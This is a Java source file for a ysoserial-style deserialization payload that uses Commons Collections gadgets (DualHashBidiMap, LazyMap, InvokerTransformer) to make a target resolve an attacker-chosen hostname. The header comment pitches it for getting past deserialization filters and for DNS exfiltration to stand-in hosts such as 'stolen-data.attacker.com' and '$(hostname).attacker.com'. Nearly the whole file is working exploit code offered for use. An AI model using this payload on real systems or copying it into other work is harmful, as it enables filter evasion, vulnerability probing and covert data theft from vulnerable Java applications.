package ysoserial.payloads;

import java.io.Serializable;
import java.net.InetAddress;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	DNS exfiltration via InetAddress.getByName() — controlled DNS lookup.

	vs URLDNS:
		- URLDNS uses HashMap → URL.hashCode() → getHostAddress()
		  Pros: no library dependency. Cons: only DNS, no filter bypass, fixed entry.
		- This chain uses DualHashBidiMap → InvokerTransformer → InetAddress.getByName()
		  Pros: filter-bypass entry, works when HashMap is blocked.

	Why this matters:
		- DNS is often the ONLY egress channel in restricted environments
		- Can encode data in subdomain: "stolen-data.attacker.com"
		- Works through firewalls that block all TCP except DNS (port 53)
		- InetAddress is NEVER in any deserialization filter
		- No TCP connection established — pure UDP DNS query

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → InetAddress.class
										InvokerTransformer → InetAddress.getByName(hostname)
											→ DNS query sent

	Data exfiltration patterns:
		- "canary.attacker.com"           → confirm vuln
		- "$(hostname).attacker.com"      → leak hostname (if shell expansion)
		- "base64data.attacker.com"       → exfil via DNS subdomain

	Filter evasion:
		1. DualHashBidiMap — not in any known filter
		2. InetAddress — JDK core class, never blocked
		3. No RCE, no JNDI, no HTTP, no file I/O
		4. Only DNS (UDP 53) — almost never blocked

	Usage: payload arg = hostname to resolve
		e.g. "canary.attacker.com"
		     "exfil-token.burpcollaborator.net"

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsDNS extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String hostname) throws Exception {

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// InetAddress.getByName(hostname) — static method via reflection
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(InetAddress.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getByName", new Class[] { String.class } }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[] { hostname } }),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		innerMap.remove("foo");

		// Arm
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsDNS.class, args);
	}
}
